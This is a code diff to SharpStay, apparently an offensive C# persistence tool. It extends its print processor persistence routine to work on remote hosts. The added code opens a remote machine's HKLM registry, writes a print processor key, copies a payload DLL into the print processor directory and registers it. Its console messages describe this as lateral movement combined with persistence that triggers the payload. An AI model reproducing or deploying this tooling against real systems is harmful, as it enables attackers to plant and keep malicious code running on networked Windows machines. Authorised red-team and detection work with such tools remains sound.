@@ -1022,27 +1022,60 @@ namespace SharpStay
             }
         }
 
-        static void PrintProcessorPersistence(string printprocessorname, string dllpath, bool cleanup = false)
+        static void PrintProcessorPersistence(string printprocessorname, string dllpath, string host, string arch, bool cleanup = false)
         {
             int length = 0;
-            GetPrintProcessorDirectory(null, null, 1, null, 0, ref length);
+            StringBuilder hostSb;
+            if (host == "")
+            {
+                Console.WriteLine("[*] Argument host not specified: doing persistence locally");
+                hostSb = null;
+            }
+            else
+            {
+                hostSb = new StringBuilder();
+                hostSb.Append(host.StartsWith("\\\\") ? host : "\\\\" + host);
+                Console.WriteLine("[*] Argument host is {0}: doing lateral movement combined with persistence remotely", host);
+            }
+            StringBuilder archSb;
+            if (arch == "")
+            {
+                archSb = null;
+            }
+            else
+            {
+                archSb = new StringBuilder();
+                archSb.Append(arch);
+            }
+            GetPrintProcessorDirectory(hostSb, archSb, 1, null, 0, ref length);
             StringBuilder str = new StringBuilder(length);
-            GetPrintProcessorDirectory(null, null, 1, str, 1024, ref length);
+            GetPrintProcessorDirectory(hostSb, archSb, 1, str, 1024, ref length);
             string pdir = str.ToString();
             Console.WriteLine("[+] Print Processor Directory is: {0}", pdir);
+            string guessedArch = pdir.Split('\\').Last();
+            Console.WriteLine("[+] Guessed arch is: {0}", guessedArch);
             string dllfilename = Path.GetFileName(dllpath);
-            string keypath = String.Format("System\\CurrentControlSet\\Control\\Print\\Environments\\Windows x64\\Print Processors\\{0}", printprocessorname);
+            string keypath = String.Format("System\\CurrentControlSet\\Control\\Print\\Environments\\Windows {0}\\Print Processors\\{1}", guessedArch, printprocessorname);
             if (cleanup == true)
             {
                 try
                 {
-                    using (var key = Registry.LocalMachine.OpenSubKey(keypath, false))
+                    RegistryKey basekey;
+                    if (host == "")
                     {
-                        dllfilename = (string)key.GetValue("Driver");
+                        basekey = Registry.LocalMachine;
                     }
+                    else
+                    {
+                        basekey = RegistryKey.OpenRemoteBaseKey(RegistryHive.LocalMachine, host);
+                    }
+                    RegistryKey regkey = basekey.OpenSubKey(keypath);
+                    dllfilename = (string)regkey.GetValue("Driver");
+                    regkey.Close();
                     Console.WriteLine("[+] Enumerated DLL filename: {0}", dllfilename);
                     dllpath = pdir + "\\" + dllfilename;
-                    Registry.LocalMachine.DeleteSubKeyTree(keypath, false);
+                    basekey.DeleteSubKeyTree(keypath, false);
+                    basekey.Close();
                     Console.WriteLine("[+] Cleaned up HKLM:{0} subkeytree", keypath);
                 }
                 catch (Exception ex)
@@ -1052,7 +1085,7 @@ namespace SharpStay
 
                 try
                 {
-                    DeletePrintProcessor(null, null, printprocessorname);
+                    DeletePrintProcessor(host, "Windows " + guessedArch, printprocessorname);
                     Console.WriteLine("[+] PrintProcessor {0} has been unregistered", printprocessorname);
                 }
                 catch (Exception ex)
@@ -1063,7 +1096,7 @@ namespace SharpStay
                 try
                 {
                     System.IO.File.Delete(dllpath);
-                    Console.WriteLine("[+] DLL file {0} deleted from PrintProcessor folder {1}", dllfilename, pdir);
+                    Console.WriteLine("[+] DLL file {0} deleted from PrintProcessor folder as {1}", dllfilename, dllpath);
                 }
                 catch (Exception ex)
                 {
@@ -1074,21 +1107,31 @@ namespace SharpStay
             {
                 try
                 {
-                    RegistryKey regkey;
-                    regkey = Registry.LocalMachine.CreateSubKey(keypath);
+                    RegistryKey basekey;
+                    if (host == "")
+                    {
+                        basekey = Registry.LocalMachine;
+                    }
+                    else
+                    {
+                        basekey = RegistryKey.OpenRemoteBaseKey(RegistryHive.LocalMachine, host);
+                    }
+                    RegistryKey regkey = basekey.CreateSubKey(keypath);
                     regkey.SetValue("Driver", Path.GetFileName(dllfilename));
                     regkey.Close();
+                    basekey.Close();
                     Console.WriteLine("[+] Created PrintProcessor Registry HKLM:{0} key and value 'Driver' set to {1}", keypath, dllfilename);
 
                     try
                     {
-                        System.IO.File.Copy(dllpath, pdir + "\\" + dllfilename, true);
-                        Console.WriteLine("[+] DLL file {0} copied to PrintProcessor folder {1}", dllpath, pdir);
+                        string target = pdir + "\\" + dllfilename;
+                        System.IO.File.Copy(dllpath, target, true);
+                        Console.WriteLine("[+] DLL file {0} copied to PrintProcessor folder as {1}", dllpath, target);
                         try
                         {
-                            bool res = AddPrintProcessor(null, null, dllfilename, printprocessorname);
+                            bool res = AddPrintProcessor(host, "Windows "+guessedArch, dllfilename, printprocessorname);
                             Console.WriteLine("[+] PrintProcessor {0} has been registered with DLL {1} (retval: {2})", printprocessorname, dllfilename, res);
-                            Console.WriteLine("[*] PrintProcessor Persistence should be working now (no worries about the false retval)");
+                            Console.WriteLine("[*] PrintProcessor should trigger the payload and persistence should be working now also (no worries about the false retval)");
                         }
                         catch (Exception ex)
                         {
@@ -1656,6 +1699,8 @@ namespace SharpStay
             else if (arguments["action"].ToLower() == "printprocessor")
             {
                 bool cleanup = false;
+                string host = "";
+                string arch = "";
                 string printprocessorname = "winprintnextgen";
                 string dllpath = "";
                 if (arguments.ContainsKey("printprocessorname"))
@@ -1678,8 +1723,16 @@ namespace SharpStay
                         dllpath = arguments["dllpath"];
                     }
                 }
+                if (arguments.ContainsKey("host"))
+                {
+                    host = arguments["host"];
+                }
+                if (arguments.ContainsKey("arch"))
+                {
+                    arch = arguments["arch"];
+                }
 
-                PrintProcessorPersistence(printprocessorname, dllpath, cleanup);
+                PrintProcessorPersistence(printprocessorname, dllpath, host, arch, cleanup);
             }
 
             else
